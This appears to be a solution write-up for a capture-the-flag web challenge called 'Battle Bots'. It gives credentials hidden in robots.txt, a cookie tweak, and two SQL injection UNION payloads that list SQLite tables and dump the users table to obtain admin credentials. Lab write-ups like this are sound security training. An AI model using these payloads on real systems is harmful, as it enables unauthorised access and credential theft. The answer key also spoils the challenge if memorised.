# Battle Bots CTF Challenge
## Solution
1. Visit `robots.txt` to get user credentials for the login page
2. Set the `searchEnabled` cookie to `true` to enable the search function
3. Use SQLi to get the `admin` user's credentials:
    - View Tables: `' AND 1=0 UNION SELECT 1, tbl_name, 1, 1 FROM sqlite_master --`
    - Retrieve Users: `' AND 1=0 UNION SELECT * FROM users --`
